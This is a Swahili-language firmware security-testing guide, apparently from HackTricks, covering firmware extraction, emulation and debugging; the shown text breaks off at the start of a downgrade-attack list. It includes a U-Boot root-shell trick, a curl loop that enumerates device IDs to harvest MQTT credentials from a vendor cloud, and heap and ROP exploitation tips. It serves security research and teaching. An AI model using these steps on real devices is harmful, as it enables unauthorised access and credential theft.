# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kusimamia na kurahisisha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu ya kudumu, hivyo kifaa kinaweza kufikia maagizo muhimu kuanzia kinapowashwa, na hivyo kuanzisha mfumo wa uendeshaji. Kuchunguza na uwezekano wa kurekebisha firmware ni hatua muhimu ya kutambua udhaifu wa usalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Muundo wa CPU na mfumo wa uendeshaji unaotumia
- Maelezo ya bootloader
- Mpangilio wa hardware na datasheet
- Vipimo vya codebase na maeneo ya chanzo
- Maktaba za nje na aina za leseni
- Historia ya masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** zina manufaa makubwa, pamoja na uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kupitia michakato ya ukaguzi wa mikono na kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis bila malipo inayoweza kutumiwa kutafuta matatizo yanayoweza kutokea.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- Kuipata **moja kwa moja** kutoka kwa chanzo (watengenezaji, wazalishaji)
- **Kuijenga** kwa kufuata maelekezo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za usaidizi
- Kutumia maswali ya **Google dork** kutafuta faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuingilia **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuichopoa** kutoka kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kusikiliza** maombi ya masasisho katika mawasiliano ya kifaa
- Kutambua na kutumia **hardcoded update endpoints**
- **Kudump** kutoka kwa bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, njia nyingine zote zikishindikana, kwa kutumia zana zinazofaa za hardware

### Kumbukumbu za UART pekee: lazimisha root shell kupitia U-Boot env kwenye flash

Ikiwa UART RX itapuuzwa (kumbukumbu pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot** ukiwa nje ya kifaa:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa kutumia klipu ya SOIC-8 na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta partition ya U-Boot env, hariri `bootargs` ili ijumuishe `init=/bin/sh`, na **ukokotoe upya U-Boot env CRC32** ya blob.
3. Andika upya partition ya env pekee na uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini partition ya env inaweza kuandikiwa kupitia ufikiaji wa flash wa nje.

## Kuchanganua firmware

Kwa kuwa sasa **una firmware**, unahitaji kutoa maelezo kuihusu ili kujua jinsi ya kuishughulikia. Zifuatazo ni baadhi ya zana unazoweza kutumia:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hutapata mengi kwa kutumia zana hizo, angalia **entropia** ya image kwa `binwalk -E <bin>`; ikiwa entropia ni ndogo, basi huenda haijasimbwa kwa njia fiche. Ikiwa entropia ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Kupata Mfumo wa Faili

Kwa kutumia zana zilizotajwa awali, kama `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa mfumo wa faili**.\
Binwalk kwa kawaida huitoa ndani ya **folder iliyopewa jina la aina ya mfumo wa faili**, ambayo kwa kawaida ni mojawapo ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Mfumo wa Faili Mwenyewe

Wakati mwingine, binwalk **haitakuwa na magic byte ya mfumo wa faili kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya mfumo wa faili na ku-carve mfumo wa faili uliobanwa** kutoka kwenye binary, kisha **utoe mfumo wa faili mwenyewe** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza **dd command** ifuatayo ili kufanya carving ya mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Baadaye, faili zitakuwa kwenye saraka ya "`squashfs-root`".

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchanganua Firmware

Baada ya kupata firmware, ni muhimu kuichambua ili kuelewa muundo wake na udhaifu unaoweza kuwepo. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Awali za Uchambuzi

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary na kuelewa maelezo ya partition na mfumo wa faili:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, hukaguliwa **entropy** kwa kutumia `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, huku entropy ya juu ikionyesha uwezekano wa usimbaji fiche au mgandamizo.

Kwa kutoa **embedded files**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi kwenye saraka iliyopewa jina la aina ya mfumo wa faili (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu ya kukosekana kwa magic bytes, uchimbaji wa mikono unahitajika. Hii inahusisha kutumia `binwalk` kupata offset ya mfumo wa faili, kisha kutumia amri ya `dd` kukata na kutoa mfumo wa faili:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), hutumika amri tofauti ili kutoa maudhui kwa mikono.

### Uchambuzi wa Filesystem

Baada ya kutoa filesystem, huanza kutafuta dosari za usalama. Huchunguza daemon za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye msimbo, API endpoints, utendakazi wa seva za masasisho, msimbo ambao haujakompilishwa, scripts za uanzishaji, na binaries zilizokompilishwa kwa uchambuzi wa offline.

**Maeneo muhimu** na **vipengee** vya kuchunguza ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa credentials za watumiaji
- Vyeti na keys za SSL katika **etc/ssl**
- Faili za usanidi na scripts zinazoweza kuwa na udhaifu
- Binaries zilizopachikwa kwa uchambuzi zaidi
- Web servers na binaries zinazotumika kwa kawaida kwenye vifaa vya IoT

Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi tuli na wa wakati wa utekelezaji

### Ukaguzi wa Usalama wa Binaries Zilizokompilishwa

Msimbo chanzo na binaries zilizokompilishwa zinazopatikana kwenye filesystem lazima zikaguliwe kwa makini ili kubaini udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kutambua binaries zisizo na ulinzi ambazo zinaweza kutumiwa vibaya.

## Kukusanya usanidi wa cloud na credentials za MQTT kupitia tokeni za URL zinazotokana na thamani nyingine

Hub nyingi za IoT hupata usanidi wa kila kifaa kutoka kwenye cloud endpoint inayofanana na hii:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchambuzi wa firmware, unaweza kugundua kuwa `<token>` hutokana na device ID ndani ya kifaa kwa kutumia secret iliyowekwa moja kwa moja kwenye msimbo, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na huwakilishwa kama herufi kubwa za hex

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kupata usanidi wa cloud, ambao mara nyingi hufichua credentials za MQTT zilizo katika maandishi wazi na viambishi awali vya topic.

Mtiririko wa vitendo:

1) Toa deviceId kutoka kwenye boot logs za UART

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unasa logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya usanidi wa cloud na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Pata STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (k.m., MD5(deviceId||STATIC_KEY)).
- Pata token kwa kutumia Bash na ubadilishe digest iwe herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya usanidi wa cloud na credentials za MQTT

- Unda URL na upakue JSON kwa kutumia curl; ichanganue kwa jq ili kutoa secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya plaintext na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana ku-subscribe kwenye maintenance topics na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha device IDs zinazotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Ecosystem nyingi hujumuisha byte za vendor OUI/product/type zikifuatiwa na suffix inayoongezeka kwa mfuatano.
- Unaweza kupitia candidate IDs, kutengeneza tokens na kupata configs kwa programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya enumeration kwa wingi.
- Ikiwezekana, pendelea emulation au static analysis ili kupata siri bila kurekebisha hardware lengwa.

Mchakato wa kufanya emulation ya firmware huwezesha **dynamic analysis** ya utendaji wa kifaa au wa programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na utegemezi wa hardware au architecture, lakini kuhamisha root filesystem au binaries mahususi kwenye kifaa chenye architecture na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyoundwa awali, kunaweza kurahisisha majaribio zaidi.

### Kufanya Emulation ya Binaries Mahususi

Unapochunguza programu moja moja, ni muhimu kutambua endianness na CPU architecture ya programu hiyo.

#### Mfano wa MIPS Architecture

Ili kufanya emulation ya binary ya MIPS architecture, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binaries za little-endian, chaguo litakuwa `qemu-mipsel`.

#### Uigaji wa Usanifu wa ARM

Kwa binaries za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kufanya uigaji.

### Uigaji Kamili wa Mfumo

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, hurahisisha uigaji kamili wa firmware, kwa kuendesha mchakato kiotomatiki na kusaidia katika uchanganuzi wa wakati wa utekelezaji.

### Kujenga upya root filesystem zilizogawanywa na kuthibitishwa kwa ajili ya uigaji

Ikiwa superblock ya SquashFS inaweza kusomeka lakini offsets za inode, directory, au fragment table haziwezekani, usiibadilishe `unsquashfs` mara moja. Reverse-engineer binary ya mwanzo wa boot na uige tena grafu ya block device inayoiunda: mifumo iliyopachikwa inaweza kuwa na partition ya root inayoonekana ya kawaida, lakini huunda filesystem halisi kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufaulu hata kama kila block ya metadata inayofuata imehamishwa.<sup>[[9]](#references)</sup>

Hifadhi hesabu za firmware jinsi zilivyo. Hasa, tambua kama urefu umeonyeshwa kwa bytes, sectors za baiti 512, au pages za 4 KiB; iga shifts na truncation kwa mpangilio wake wa awali; na uzingatie maeneo ya mwisho yanayotegemea bank katika miundo ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata thamani hadi kwenye mpaka wa 4 KiB na kisha tu kueleza matokeo kwa sectors za baiti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza eneo lililoongezwa kwa kilobytes chache na kuharibu jedwali zote za SquashFS zinazofuata.<sup>[[9]](#references)</sup>

Mtiririko muhimu wa uthibitishaji ni:<sup>[[9]](#references)</sup>

1. Pata tena kifaa chanzo, sector ya mwanzo, na urefu wa kila segment ya `dm-linear` kutoka kwenye binary ya verifier/init.
2. Unganisha au panga extents bila kubadilisha kanuni zake za alignment.
3. Ikiwa uchimbuaji bado unashindwa, tafuta kwenye eneo dogo tu linalozunguka mpaka uliotabiriwa na uthibitishe miundo kadhaa halali ya metadata inayofuatana, badala ya kukubali superblock inayoonekana kuwa sahihi pekee.
4. Endesha `unsquashfs` ambayo haijabadilishwa dhidi ya image iliyojengwa upya; kufanikiwa kupitia directories na fragments zote ni ushahidi thabiti zaidi kuliko `unsquashfs -stat`.

#### Ubadilishaji wa dm-verity unaodhibitiwa na mchambuzi

Mchambuzi anapodhibiti kernel ya QEMU, initramfs, na virtual disks, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya vendor na init ndogo iliyounganishwa ki-statically. Huu ni **ubadilishaji wa lab boot-chain**, si kuvunja dm-verity, saini yake ya RSA, Secure Boot, au ufunguo uliofungwa kwa TPM.<sup>[[9]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za njia ya boot asilia zinazohitajika kiutendaji: mount `devtmpfs`, kuita `setsid()`, kuunganisha `/dev/console` na file descriptors 0–2, mount `/proc` na `/sys`, kusubiri block device iliyotolewa, mount root iliyohaririwa katika hali ya kusoma tu, kutenganisha pseudo-filesystems za root ya zamani, kuhamisha mount mpya hadi `/` kwa kutumia `MS_MOVE`, kuita `chroot`, na kutekeleza `/sbin/init` asilia ya firmware kwa `execve()`. Kutenganisha `/dev`, `/proc`, na `/sys` **kabla** ya `MS_MOVE` huzuia kwa bahati mbaya kutenganisha mount points za root mpya.<sup>[[9]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika kando na root isiyoweza kubadilishwa iliyorekebishwa. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski asilia huku diski ya pili ya virtio ya kusoma tu ikitoa SquashFS iliyohaririwa:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu za hali ya image nje ya mtandao

Kagua hali inayodumu nje ya guest wakati boot za polepole, script za uanzishaji zinazoharibu data, au logi za console zisizoaminika zinaficha hitilafu. Usiunganishe overlay inayotumiwa na VM inayoendesha; ifanye ipatikane kwa `qemu-nbd`, weka kikomo cha ugunduzi wa LVM kwenye partition ya NBD iliyokusudiwa, na uzime volume group kabla ya kuikata.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa utenganishaji wa hitilafu unaoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye hifadhi thabiti inayoweza kuandikwa, kisha uzihakiki ukiwa nje ya kifaa; `/dev/kmsg`, FIFOs na koni za muda zinaweza kutoa matokeo hasi ya uongo kutokana na kuwekwa kwa vikomo vya kasi au mchakato kufa mapema. Pia linganisha violesura halisi katika tabaka mbalimbali kabla ya kubadilisha msimbo usiohusiana: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya ABI ya kiendeshi cha DRI na majina ya viendeshi yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` kufanikiwa, lakini bado kisiweze kutumika kwa sababu mtumiaji wake anatarajia ABI tofauti.<sup>[[9]](#references)</sup>

## Uchambuzi wa Dynamic kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilichoigwa hutumiwa kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na mfumo wa faili. Uigaji huenda usiige kikamilifu mwingiliano wa maunzi, hivyo huenda ikahitajika kuanzisha upya uigaji mara kwa mara. Uchambuzi unapaswa kuchunguza tena mfumo wa faili, kutumia exploit kwenye kurasa za wavuti zilizo wazi na huduma za mtandao, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kutambua udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Uchambuzi wa Runtime

Uchambuzi wa runtime huhusisha kuingiliana na mchakato au binary katika mazingira yake ya utekelezaji, kwa kutumia zana kama gdb-multiarch, Frida na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa mifumo lengwa iliyopachikwa ambayo haina debugger kamili, **nakili `gdbserver` iliyounganishwa tuli** kwenye kifaa na uunganishe nayo ukiwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Uwekaji ramani wa ujumbe wa Zigbee / radio-co-processor

Kwenye IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Mtiririko muhimu ni kuweka ramani ya njia:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda malengo mawili ya reversing badala ya moja. Ikiwa controller hubadilisha binary radio frames kuwa textual protocol kama `Group,Command,arg1,arg2,...`, bainisha:

- **Message groups** na dispatch tables
- Ni ujumbe gani unaweza kutoka kwenye **network** na upi kutoka kwa controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers zipi zinafikiwa tu wakati wa **commissioning**, discovery, au awamu za kupakua firmware/model

Hasa kwa Zigbee, nasa pairing traffic na uangalie kama kifaa lengwa bado kinatumia **Link Key** chaguomsingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo hakikisha kama kifaa kilichojaribiwa kinazitekeleza kwa lazima.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri za Zigbee/ZCL maalum za vendor mara nyingi huwa malengo bora kuliko clusters zilizosanifishwa, kwa sababu hupeleka data kwenye **custom parsing code** na **FSMs** za ndani zenye validation ambayo haijajaribiwa vya kutosha.<sup>[[8]](#references)</sup>

Mtiririko wa kazi unaotekelezeka:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Baini majedwali ya **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe, pamoja na matawi ya retry/error ambayo hatimaye hu-reset au kuachilia hali inayodhibitiwa na mshambuliaji.
- Thibitisha ni mawasiliano gani halali ya protocol yanayohitajika ili kuiweka daemon kwenye hali hatarishi, badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa wakati wowote.

Kwa protocols zinazotegemea muda, packet replay kutoka Python framework inaweza kuwa polepole mno. Njia inayotegemewa zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kufichua **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya fragmented-download kwenye embedded daemons

Aina ya hitilafu ya firmware inayojirudia hutokea kwenye upakuaji wa **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragments zinazofuata hukagua tu sehemu zinazodhibitiwa na mshambuliaji za **packet-local**, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuhakiki ukubwa wa awali uliotengwa.

Hii humwezesha mshambuliaji kutuma:

- First fragment halali yenye ukubwa **mdogo** uliotangazwa ili kulazimisha ugawaji mdogo wa heap.
- Fragment inayofuata yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Ukubwa wa packet-local ulioghushiwa unaokidhi ukaguzi mpya huku bado ukisababisha buffer iliyotengwa awali kufurika.

Njia hatarishi inapokuwa nyuma ya commissioning logic, exploitation lazima ijumuisha **device emulation** ya kutosha ili kuendesha kifaa lengwa hadi kwenye hali inayotarajiwa ya model-download au blob-download kabla ya kutuma fragments zenye hitilafu.

### Vichocheo vya `free()` vinavyoendeshwa na protocol

Kwenye embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si “kusubiri cleanup” bali ni **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma follow-up fragments zenye hitilafu ili kupeleka FSM kwenye hali za **retry** au **error**.
- Vuka kiwango cha juu cha retry ili daemon **ireset context** na kuachilia buffer iliyoharibiwa.
- Tumia `free()` hii inayotabirika kuchochea allocator-side primitives kabla mchakato hauja-crash kwa sababu nyingine zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators za **musl/uClibc/dlmalloc-like** kwenye embedded Linux, ambako kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyofurika**, badala ya kuharibu mara moja bin pointers halisi na kusababisha mchakato ku-crash.

## Binary Exploitation and Proof-of-Concept

Kutengeneza PoC ya vulnerabilities zilizobainishwa kunahitaji uelewa wa kina wa usanifu wa kifaa lengwa na programu katika lugha za kiwango cha chini. Ulinzi wa binary runtime ni nadra kwenye embedded systems, lakini unapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Ugawaji mkubwa unaofuata unaweza kuchochea `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks zinazoizunguka zitambulike kuwa “in use”).<sup>[[6]](#references)</sup>
- **Non-PIE binaries chini ya ASLR:** ikiwa ASLR imewezeshwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na header halali ya heap chunk ili fastbin allocation itue kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapoparsewa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikihifadhi bytes zinazofuata zinazodhibitiwa na mshambuliaji kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayotumia `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kupachika shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kurukia hapo.

## Mifumo ya Uendeshaji Iliyotayarishwa kwa Firmware Analysis

Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya majaribio ya usalama wa firmware, yakiwa na zana zinazohitajika.

## OS Zilizotayarishwa kwa ajili ya kuchambua Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote zinazohitajika tayari.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Mfumo wa uendeshaji wa majaribio ya usalama wa embedded unaotegemea Ubuntu 18.04, ukiwa na zana za majaribio ya usalama wa firmware zilizopakiwa awali.

## Mashambulizi ya Firmware Downgrade na Mbinu za Update Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa saini za kriptografia kwa firmware images, **ulinzi dhidi ya kurudisha toleo nyuma (downgrade) mara nyingi huachwa**. Ikiwa boot- au recovery-loader hukagua tu saini kwa kutumia public key iliyopachikwa lakini hailinganishi *version* (au monotonic counter) ya image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani, iliyo hatarini, ambayo bado ina saini halali** na hivyo kurudisha vulnerabilities zilizokuwa zimesahihishwa.<sup>[[4]](#references)</sup>

Mtiririko wa kawaida wa mashambulizi:

1. **Pata image ya zamani iliyosainiwa**
